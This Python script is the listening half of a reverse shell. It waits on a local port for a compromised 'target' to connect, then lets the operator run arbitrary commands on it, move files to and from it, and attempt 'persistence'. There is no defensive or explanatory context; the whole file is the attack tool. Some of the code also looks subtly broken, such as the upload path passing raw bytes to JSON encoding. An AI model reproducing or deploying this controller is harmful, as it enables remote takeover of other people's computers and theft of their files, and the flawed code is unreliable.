#!/usr/bin/python
import base64
import socket
import json


def shell():
    while True:
        cmd = input("* Shell#~%s: " % str(ip))
        if cmd == "exit":
            break
        elif cmd[:4] == "help":
            print('Available functions:'
                  '\n- cd {path} => change host directory'
                  '\n- download {file} => Download a file from host'
                  '\n- upload {file} => Upload a file to the host'
                  '\n- persistence => Try acquiring persistence')
        elif cmd[:2] == "cd" and len(cmd) > 1:
            reliable_send(cmd)
        elif cmd[:8] == "download":
            download(cmd)
        elif cmd[:6] == "upload":
            upload(cmd)
        else:
            reliable_send(cmd)
            print(reliable_recv())


def server():
    global s, target, ip
    # AF_INET=ipv4
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", 6666))
    s.listen(5)  # specify the n of connection to accept
    print("Listening to incoming connections...")
    target, ip = s.accept()
    print("Target Connected")


def reliable_send(data):
    json_data = json.dumps(data).encode()
    target.send(json_data)


def reliable_recv():
    json_data = bytearray()
    while True:
        try:
            json_data = json_data + target.recv(1024)
            return json.loads(json_data.decode())
        except ValueError:
            continue


def download(cmd):
    try:
        with open(cmd[9:], "wb") as file:
            result = reliable_recv()
            file.write(base64.b64decode(result))
            return True
    except:
        return False


def upload(cmd):
    try:
        with open(cmd[7:], "rb") as file:
            reliable_send(base64.b64encode(file.read()))
            return True
    except:
        return False


if __name__ == '__main__':
    server()
    shell()
    s.close()
